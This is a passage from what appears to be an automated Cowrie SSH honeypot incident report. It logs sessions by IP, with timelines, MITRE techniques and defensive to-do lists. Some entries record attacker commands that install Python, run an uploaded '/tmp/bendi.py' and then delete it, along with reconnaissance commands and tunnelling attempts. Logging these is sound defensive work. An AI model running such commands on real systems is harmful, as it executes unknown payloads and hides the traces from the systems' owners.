| `2026-08-19 11:37:47` | `cowrie.command.failed` |
| `2026-08-19 11:37:48` | `cowrie.command.input` |
| `2026-08-19 11:37:48` | `cowrie.command.failed` |
| `2026-08-19 11:37:48` | `cowrie.command.input` |
| `2026-08-19 11:37:48` | `cowrie.command.input` |
| `2026-08-19 11:37:48` | `cowrie.command.failed` |
| `2026-08-19 11:37:48` | `cowrie.command.failed` |
| `2026-08-19 11:38:19` | `cowrie.log.closed` |
| `2026-08-19 11:38:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-347fbf2d50c7

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-08-19 11:38 |
| **Last Seen** | 2026-08-19 11:38 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:38:19` | `cowrie.session.connect` |
| `2026-08-19 11:38:20` | `cowrie.login.success` |
| `2026-08-19 11:38:20` | `cowrie.session.params` |
| `2026-08-19 11:38:21` | `cowrie.command.input` |
| `2026-08-19 11:38:21` | `cowrie.command.failed` |
| `2026-08-19 11:38:21` | `cowrie.command.input` |
| `2026-08-19 11:38:21` | `cowrie.command.failed` |
| `2026-08-19 11:38:21` | `cowrie.command.input` |
| `2026-08-19 11:38:21` | `cowrie.command.failed` |
| `2026-08-19 11:38:22` | `cowrie.command.input` |
| `2026-08-19 11:38:22` | `cowrie.command.failed` |
| `2026-08-19 11:38:22` | `cowrie.command.input` |
| `2026-08-19 11:38:22` | `cowrie.command.input` |
| `2026-08-19 11:38:22` | `cowrie.command.failed` |
| `2026-08-19 11:38:22` | `cowrie.command.failed` |
| `2026-08-19 11:38:53` | `cowrie.log.closed` |
| `2026-08-19 11:38:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a839902bd4e

| Field | Detail |
|---|---|
| **Source IP** | `110.173.190[.]221` |
| **First Seen** | 2026-08-19 11:38 |
| **Last Seen** | 2026-08-19 11:39 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:38:48` | `cowrie.session.connect` |
| `2026-08-19 11:38:49` | `cowrie.client.version` |
| `2026-08-19 11:38:49` | `cowrie.client.kex` |
| `2026-08-19 11:38:56` | `cowrie.login.success` |
| `2026-08-19 11:39:00` | `cowrie.session.params` |
| `2026-08-19 11:39:00` | `cowrie.command.input` |
| `2026-08-19 11:39:02` | `cowrie.log.closed` |
| `2026-08-19 11:39:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.173.190[.]221` to AbuseIPDB if not already reported
- [ ] Block `110.173.190[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-634f6b24d653

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-08-19 11:38 |
| **Last Seen** | 2026-08-19 11:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:38:50` | `cowrie.session.connect` |
| `2026-08-19 11:38:50` | `cowrie.client.version` |
| `2026-08-19 11:38:50` | `cowrie.client.kex` |
| `2026-08-19 11:38:50` | `cowrie.login.success` |
| `2026-08-19 11:38:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29622b38d2bc

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-08-19 11:38 |
| **Last Seen** | 2026-08-19 11:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:38:50` | `cowrie.session.connect` |
| `2026-08-19 11:38:50` | `cowrie.client.version` |
| `2026-08-19 11:38:50` | `cowrie.client.kex` |
| `2026-08-19 11:38:51` | `cowrie.login.success` |
| `2026-08-19 11:38:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-33218ee5bf34

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-08-19 11:38 |
| **Last Seen** | 2026-08-19 11:39 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:38:53` | `cowrie.session.connect` |
| `2026-08-19 11:38:53` | `cowrie.login.success` |
| `2026-08-19 11:38:54` | `cowrie.session.params` |
| `2026-08-19 11:38:54` | `cowrie.command.input` |
| `2026-08-19 11:38:55` | `cowrie.command.input` |
| `2026-08-19 11:38:55` | `cowrie.command.failed` |
| `2026-08-19 11:38:55` | `cowrie.command.input` |
| `2026-08-19 11:38:55` | `cowrie.command.failed` |
| `2026-08-19 11:38:55` | `cowrie.command.input` |
| `2026-08-19 11:38:55` | `cowrie.command.failed` |
| `2026-08-19 11:38:55` | `cowrie.command.input` |
| `2026-08-19 11:38:55` | `cowrie.command.failed` |
| `2026-08-19 11:38:56` | `cowrie.command.input` |
| `2026-08-19 11:38:56` | `cowrie.command.input` |
| `2026-08-19 11:38:56` | `cowrie.command.failed` |
| `2026-08-19 11:38:56` | `cowrie.command.failed` |
| `2026-08-19 11:39:27` | `cowrie.log.closed` |
| `2026-08-19 11:39:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50ff132d1327

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-08-19 11:38 |
| **Last Seen** | 2026-08-19 11:41 |
| **Session Duration** | 127s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:38:56` | `cowrie.session.connect` |
| `2026-08-19 11:38:56` | `cowrie.client.version` |
| `2026-08-19 11:38:56` | `cowrie.client.kex` |
| `2026-08-19 11:38:57` | `cowrie.login.success` |
| `2026-08-19 11:38:58` | `cowrie.session.file_upload` |
| `2026-08-19 11:38:59` | `cowrie.session.params` |
| `2026-08-19 11:38:59` | `cowrie.command.input` |
| `2026-08-19 11:38:59` | `cowrie.command.input` |
| `2026-08-19 11:38:59` | `cowrie.command.input` |
| `2026-08-19 11:38:59` | `cowrie.command.failed` |
| `2026-08-19 11:38:59` | `cowrie.log.closed` |
| `2026-08-19 11:39:00` | `cowrie.session.params` |
| `2026-08-19 11:39:00` | `cowrie.command.input` |
| `2026-08-19 11:39:00` | `cowrie.log.closed` |
| `2026-08-19 11:39:01` | `cowrie.session.params` |
| `2026-08-19 11:39:01` | `cowrie.command.input` |
| `2026-08-19 11:39:01` | `cowrie.log.closed` |
| `2026-08-19 11:39:02` | `cowrie.session.params` |
| `2026-08-19 11:39:02` | `cowrie.command.input` |
| `2026-08-19 11:39:02` | `cowrie.command.failed` |
| `2026-08-19 11:39:02` | `cowrie.command.failed` |
| `2026-08-19 11:40:03` | `cowrie.session.params` |
| `2026-08-19 11:40:03` | `cowrie.command.input` |
| `2026-08-19 11:41:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc1fc66243aa

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-08-19 11:39 |
| **Last Seen** | 2026-08-19 11:40 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:39:27` | `cowrie.session.connect` |
| `2026-08-19 11:39:28` | `cowrie.login.success` |
| `2026-08-19 11:39:28` | `cowrie.session.params` |
| `2026-08-19 11:39:29` | `cowrie.command.input` |
| `2026-08-19 11:39:29` | `cowrie.command.failed` |
| `2026-08-19 11:39:29` | `cowrie.command.input` |
| `2026-08-19 11:39:29` | `cowrie.command.failed` |
| `2026-08-19 11:39:30` | `cowrie.command.input` |
| `2026-08-19 11:39:30` | `cowrie.command.failed` |
| `2026-08-19 11:39:30` | `cowrie.command.input` |
| `2026-08-19 11:39:30` | `cowrie.command.failed` |
| `2026-08-19 11:39:30` | `cowrie.command.input` |
| `2026-08-19 11:39:30` | `cowrie.command.input` |
| `2026-08-19 11:39:30` | `cowrie.command.failed` |
| `2026-08-19 11:39:30` | `cowrie.command.failed` |
| `2026-08-19 11:40:01` | `cowrie.log.closed` |
| `2026-08-19 11:40:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cfe2d3bcab2

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-08-19 11:40 |
| **Last Seen** | 2026-08-19 11:40 |
| **Session Duration** | 34s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:40:01` | `cowrie.session.connect` |
| `2026-08-19 11:40:02` | `cowrie.login.success` |
| `2026-08-19 11:40:03` | `cowrie.login.success` |
| `2026-08-19 11:40:04` | `cowrie.session.params` |
| `2026-08-19 11:40:04` | `cowrie.command.input` |
| `2026-08-19 11:40:04` | `cowrie.command.failed` |
| `2026-08-19 11:40:05` | `cowrie.command.input` |
| `2026-08-19 11:40:05` | `cowrie.command.failed` |
| `2026-08-19 11:40:05` | `cowrie.command.input` |
| `2026-08-19 11:40:05` | `cowrie.command.input` |
| `2026-08-19 11:40:05` | `cowrie.command.failed` |
| `2026-08-19 11:40:05` | `cowrie.command.failed` |
| `2026-08-19 11:40:36` | `cowrie.log.closed` |
| `2026-08-19 11:40:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6ff0becfe8a

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-08-19 11:40 |
| **Last Seen** | 2026-08-19 11:41 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:40:36` | `cowrie.session.connect` |
| `2026-08-19 11:40:37` | `cowrie.login.success` |
| `2026-08-19 11:40:37` | `cowrie.session.params` |
| `2026-08-19 11:40:38` | `cowrie.command.input` |
| `2026-08-19 11:40:38` | `cowrie.command.failed` |
| `2026-08-19 11:40:38` | `cowrie.command.input` |
| `2026-08-19 11:40:38` | `cowrie.command.failed` |
| `2026-08-19 11:40:38` | `cowrie.command.input` |
| `2026-08-19 11:40:38` | `cowrie.command.failed` |
| `2026-08-19 11:40:39` | `cowrie.command.input` |
| `2026-08-19 11:40:39` | `cowrie.command.failed` |
| `2026-08-19 11:40:39` | `cowrie.command.input` |
| `2026-08-19 11:40:39` | `cowrie.command.input` |
| `2026-08-19 11:40:39` | `cowrie.command.failed` |
| `2026-08-19 11:40:39` | `cowrie.command.failed` |
| `2026-08-19 11:41:10` | `cowrie.log.closed` |
| `2026-08-19 11:41:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17480a277652

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-08-19 11:41 |
| **Last Seen** | 2026-08-19 11:43 |
| **Session Duration** | 126s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:41:04` | `cowrie.session.connect` |
| `2026-08-19 11:41:04` | `cowrie.client.version` |
| `2026-08-19 11:41:04` | `cowrie.client.kex` |
| `2026-08-19 11:41:05` | `cowrie.login.success` |
| `2026-08-19 11:41:06` | `cowrie.session.file_upload` |
| `2026-08-19 11:41:06` | `cowrie.session.params` |
| `2026-08-19 11:41:06` | `cowrie.command.input` |
| `2026-08-19 11:41:06` | `cowrie.command.input` |
| `2026-08-19 11:41:06` | `cowrie.command.input` |
| `2026-08-19 11:41:06` | `cowrie.command.failed` |
| `2026-08-19 11:41:07` | `cowrie.log.closed` |
| `2026-08-19 11:41:07` | `cowrie.session.params` |
| `2026-08-19 11:41:07` | `cowrie.command.input` |
| `2026-08-19 11:41:08` | `cowrie.log.closed` |
| `2026-08-19 11:41:08` | `cowrie.session.params` |
| `2026-08-19 11:41:08` | `cowrie.command.input` |
| `2026-08-19 11:41:08` | `cowrie.log.closed` |
| `2026-08-19 11:41:09` | `cowrie.session.params` |
| `2026-08-19 11:41:09` | `cowrie.command.input` |
| `2026-08-19 11:41:09` | `cowrie.command.failed` |
| `2026-08-19 11:41:09` | `cowrie.command.failed` |
| `2026-08-19 11:42:10` | `cowrie.session.params` |
| `2026-08-19 11:42:10` | `cowrie.command.input` |
| `2026-08-19 11:43:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-561de7333e4b

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-08-19 11:41 |
| **Last Seen** | 2026-08-19 11:41 |
| **Session Duration** | 33s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:41:10` | `cowrie.session.connect` |
| `2026-08-19 11:41:11` | `cowrie.login.success` |
| `2026-08-19 11:41:12` | `cowrie.login.success` |
| `2026-08-19 11:41:12` | `cowrie.session.params` |
| `2026-08-19 11:41:13` | `cowrie.command.input` |
| `2026-08-19 11:41:13` | `cowrie.command.failed` |
| `2026-08-19 11:41:13` | `cowrie.command.input` |
| `2026-08-19 11:41:13` | `cowrie.command.failed` |
| `2026-08-19 11:41:13` | `cowrie.command.input` |
| `2026-08-19 11:41:13` | `cowrie.command.input` |
| `2026-08-19 11:41:13` | `cowrie.command.failed` |
| `2026-08-19 11:41:13` | `cowrie.command.failed` |
| `2026-08-19 11:41:44` | `cowrie.log.closed` |
| `2026-08-19 11:41:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79d60be6f221

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-08-19 11:41 |
| **Last Seen** | 2026-08-19 11:42 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:41:44` | `cowrie.session.connect` |
| `2026-08-19 11:41:45` | `cowrie.login.success` |
| `2026-08-19 11:41:45` | `cowrie.session.params` |
| `2026-08-19 11:41:46` | `cowrie.command.input` |
| `2026-08-19 11:41:46` | `cowrie.command.failed` |
| `2026-08-19 11:41:46` | `cowrie.command.input` |
| `2026-08-19 11:41:46` | `cowrie.command.failed` |
| `2026-08-19 11:41:46` | `cowrie.command.input` |
| `2026-08-19 11:41:46` | `cowrie.command.failed` |
| `2026-08-19 11:41:47` | `cowrie.command.input` |
| `2026-08-19 11:41:47` | `cowrie.command.failed` |
| `2026-08-19 11:41:47` | `cowrie.command.input` |
| `2026-08-19 11:41:47` | `cowrie.command.input` |
| `2026-08-19 11:41:47` | `cowrie.command.failed` |
| `2026-08-19 11:41:47` | `cowrie.command.failed` |
| `2026-08-19 11:42:18` | `cowrie.log.closed` |
| `2026-08-19 11:42:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-553907a4a654

| Field | Detail |
|---|---|
| **Source IP** | `169.211.128[.]234` |
| **First Seen** | 2026-08-19 11:42 |
| **Last Seen** | 2026-08-19 11:42 |
| **Session Duration** | 33s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:42:18` | `cowrie.session.connect` |
| `2026-08-19 11:42:19` | `cowrie.login.success` |
| `2026-08-19 11:42:19` | `cowrie.session.params` |
| `2026-08-19 11:42:20` | `cowrie.command.input` |
| `2026-08-19 11:42:20` | `cowrie.command.failed` |
| `2026-08-19 11:42:20` | `cowrie.command.input` |
| `2026-08-19 11:42:20` | `cowrie.command.failed` |
| `2026-08-19 11:42:20` | `cowrie.command.input` |
| `2026-08-19 11:42:20` | `cowrie.command.failed` |
| `2026-08-19 11:42:21` | `cowrie.command.input` |
| `2026-08-19 11:42:21` | `cowrie.command.failed` |
| `2026-08-19 11:42:21` | `cowrie.command.input` |
| `2026-08-19 11:42:21` | `cowrie.command.input` |
| `2026-08-19 11:42:21` | `cowrie.command.failed` |
| `2026-08-19 11:42:21` | `cowrie.command.failed` |
| `2026-08-19 11:42:52` | `cowrie.log.closed` |
| `2026-08-19 11:42:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `169.211.128[.]234` to AbuseIPDB if not already reported
- [ ] Block `169.211.128[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7aeecc5dfb0c

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 11:42 |
| **Last Seen** | 2026-08-19 11:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:42:34` | `cowrie.session.connect` |
| `2026-08-19 11:42:34` | `cowrie.client.version` |
| `2026-08-19 11:42:34` | `cowrie.client.kex` |
| `2026-08-19 11:42:34` | `cowrie.login.success` |
| `2026-08-19 11:42:35` | `cowrie.session.params` |
| `2026-08-19 11:42:35` | `cowrie.command.input` |
| `2026-08-19 11:42:35` | `cowrie.log.closed` |
| `2026-08-19 11:42:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75d7cb7e095c

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-19 11:45 |
| **Last Seen** | 2026-08-19 11:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:45:10` | `cowrie.session.connect` |
| `2026-08-19 11:45:10` | `cowrie.client.version` |
| `2026-08-19 11:45:11` | `cowrie.client.kex` |
| `2026-08-19 11:45:11` | `cowrie.login.success` |
| `2026-08-19 11:45:11` | `cowrie.direct-tcpip.request` |
| `2026-08-19 11:45:11` | `cowrie.direct-tcpip.data` |
| `2026-08-19 11:45:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-885eb0880182

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 11:48 |
| **Last Seen** | 2026-08-19 11:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:48:30` | `cowrie.session.connect` |
| `2026-08-19 11:48:30` | `cowrie.client.version` |
| `2026-08-19 11:48:30` | `cowrie.client.kex` |
| `2026-08-19 11:48:30` | `cowrie.login.success` |
| `2026-08-19 11:48:31` | `cowrie.session.params` |
| `2026-08-19 11:48:31` | `cowrie.command.input` |
| `2026-08-19 11:48:31` | `cowrie.log.closed` |
| `2026-08-19 11:48:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62c1fea15ea0

| Field | Detail |
|---|---|
| **Source IP** | `62.183.82[.]70` |
| **First Seen** | 2026-08-19 11:50 |
| **Last Seen** | 2026-08-19 11:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:50:55` | `cowrie.session.connect` |
| `2026-08-19 11:50:56` | `cowrie.client.version` |
| `2026-08-19 11:50:56` | `cowrie.client.kex` |
| `2026-08-19 11:50:58` | `cowrie.login.success` |
| `2026-08-19 11:50:59` | `cowrie.direct-tcpip.request` |
| `2026-08-19 11:51:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.183.82[.]70` to AbuseIPDB if not already reported
- [ ] Block `62.183.82[.]70` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e3cc6f11e89

| Field | Detail |
|---|---|
| **Source IP** | `111.70.23[.]250` |
| **First Seen** | 2026-08-19 11:51 |
| **Last Seen** | 2026-08-19 11:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:51:09` | `cowrie.session.connect` |
| `2026-08-19 11:51:10` | `cowrie.client.version` |
| `2026-08-19 11:51:10` | `cowrie.client.kex` |
| `2026-08-19 11:51:12` | `cowrie.login.success` |
| `2026-08-19 11:51:13` | `cowrie.direct-tcpip.request` |
| `2026-08-19 11:51:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.23[.]250` to AbuseIPDB if not already reported
- [ ] Block `111.70.23[.]250` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dbd09deb374

| Field | Detail |
|---|---|
| **Source IP** | `110.173.190[.]221` |
| **First Seen** | 2026-08-19 11:51 |
| **Last Seen** | 2026-08-19 11:51 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:51:14` | `cowrie.session.connect` |
| `2026-08-19 11:51:16` | `cowrie.client.version` |
| `2026-08-19 11:51:16` | `cowrie.client.kex` |
| `2026-08-19 11:51:22` | `cowrie.login.success` |
| `2026-08-19 11:51:25` | `cowrie.session.params` |
| `2026-08-19 11:51:25` | `cowrie.command.input` |
| `2026-08-19 11:51:27` | `cowrie.log.closed` |
| `2026-08-19 11:51:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.173.190[.]221` to AbuseIPDB if not already reported
- [ ] Block `110.173.190[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6943c960ea1a

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 11:54 |
| **Last Seen** | 2026-08-19 11:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 11:54:26` | `cowrie.session.connect` |
| `2026-08-19 11:54:26` | `cowrie.client.version` |
| `2026-08-19 11:54:26` | `cowrie.client.kex` |
| `2026-08-19 11:54:27` | `cowrie.login.success` |
| `2026-08-19 11:54:27` | `cowrie.session.params` |
| `2026-08-19 11:54:27` | `cowrie.command.input` |
| `2026-08-19 11:54:27` | `cowrie.log.closed` |
| `2026-08-19 11:54:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3bbb667e112

| Field | Detail |
|---|---|
